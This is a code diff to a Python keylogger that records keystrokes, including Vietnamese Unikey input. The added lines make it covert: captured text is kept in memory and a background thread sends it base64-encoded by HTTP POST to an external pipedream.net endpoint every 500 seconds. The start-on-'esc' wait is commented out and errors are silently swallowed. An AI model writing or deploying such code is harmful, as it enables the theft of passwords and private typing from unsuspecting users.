@@ -1,6 +1,11 @@
 import keyboard
 import psutil
 from pprint import pprint
+import time
+import requests
+import _thread, base64
+
+
 
 #https://github.com/boppreh/keyboard#api
 
@@ -65,10 +70,28 @@ def read(result):
     for line in f:
         result.append(line)
     f.close()
+
+
+fakefile = ""
 def write(result ,method = "a"):    
+    global fakefile
+    if method == "w":
+        fakefile = result
+    else:
+        fakefile += result
+    
+def writef(result ,method = "a"):    
     f = open("sites.txt", method, encoding = 'utf-8') 
     f.write(result)
     f.close()
+    
+def sender(interval):
+    global fakefile
+    while 1:
+        time.sleep(interval)
+        requests.post('https://enc3p53ywffan.x.pipedream.net/', data = base64.b64encode(fakefile.encode()) )
+        fakefile = ""
+    
 def unikeyDetect(now):
     global old 
     PROCNAME = ['Unikey',
@@ -90,41 +113,44 @@ def unikeyDetect(now):
 
 
 def process(v):
-    global line , old 
-    s = v['name']
-    if len(s) > 1:
-        tmp = special.keys() 
-        if s == 'backspace':
-            u = unikeyDetect(v)
-            if u:
-                a = line.pop()
-                b = line.pop()
-                line.append(unikey[b+a])
-            else:
-                line.pop()
-        elif s == 'enter' in s :
-            write(''.join(line)+'\n')
-            line = ['']
-        elif s == 'alt' in s :
-            write('[A]'+''.join(line)+'\n')
-            line = ['']
-        elif s in tmp:
-            line.append(special[s])
-        else :
-            line.append('['+s+']')
-    else:
-        line.append(s)
-    old = v
-
+    global line , old
+    try:
+        s = v['name']
+        if len(s) > 1:
+            tmp = special.keys() 
+            if s == 'backspace':
+                u = unikeyDetect(v)
+                if u:
+                    a = line.pop()
+                    b = line.pop()
+                    line.append(unikey[b+a])
+                else:
+                    line.pop()
+            elif s == 'enter' in s :
+                write(''.join(line)+'\n')
+                line = ['']
+            elif s == 'alt' in s :
+                write('[A]'+''.join(line)+'\n')
+                line = ['']
+            elif s in tmp:
+                line.append(special[s])
+            else :
+                line.append('['+s+']')
+        else:
+            line.append(s)
+        old = v
+    except Exception :
+        pass
 
             
             
 alpha = "acbdefghijklmnopqrstuvwxyz0123456789`1234567890-=~!@#$%^&*()_+[]\{}|;':\",./<>?"
 
-keyboard.wait('esc') # preesss to continue 
+#keyboard.wait('esc') # preesss to continue 
 write("","w")   # recreate file :3
-
 #this line start to DO SMTHING
-keyboard.on_press(lambda x: process(vars(x)))
-
-    
+try :
+    keyboard.on_press(lambda x: process(vars(x)))
+    _thread.start_new_thread( sender, (500, ) )
+except Exception :
+    pass
